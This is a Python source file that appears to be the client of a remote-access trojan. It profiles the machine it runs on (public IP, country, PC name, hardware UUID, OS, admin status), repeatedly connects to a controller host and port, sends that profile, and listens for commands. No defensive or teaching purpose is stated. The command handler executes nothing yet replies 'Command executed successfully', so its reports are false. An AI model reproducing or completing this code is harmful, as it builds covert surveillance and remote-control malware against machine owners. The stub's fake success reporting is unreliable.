
import socket
import time
import platform
import ctypes
import requests
from wmi import WMI

def check_account_type():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            return "Admin"
        else:
            return "User"
    except Exception:
        return "None"
        
def get_client_info():
    system = platform.system()
    version = platform.version().split('.')[0]
    os = f"{system} {version}"
    response = requests.get('https://ipapi.co/json/')
    data = response.json()
    ip = data.get('ip')
    country = data.get('country_name')

    client_info = {
        "IP": ip, 
        "PC Name": platform.node(),  
        "PC ID":  WMI().Win32_ComputerSystemProduct()[0].UUID,
        "OS": os, 
        "Account Type": check_account_type(), 
        "Country": country,
        "Tag": "Remote PC",
        }
    return client_info

def start_connection(HOST, PORT):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST, PORT))
            client_info = get_client_info()
            client_socket.sendall(str(client_info).encode('utf-8'))
            print(f"{client_info} sent to: {HOST}:{PORT}")
            handle_connection(client_socket)
        except Exception as e:
            print(e)
            time.sleep(5)
        finally:
            client_socket.close()

def handle_connection(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8').strip()
            if command:
                client_socket.sendall(f"Command executed successfully: {command}\n".encode('utf-8'))
    except:
        client_socket.close()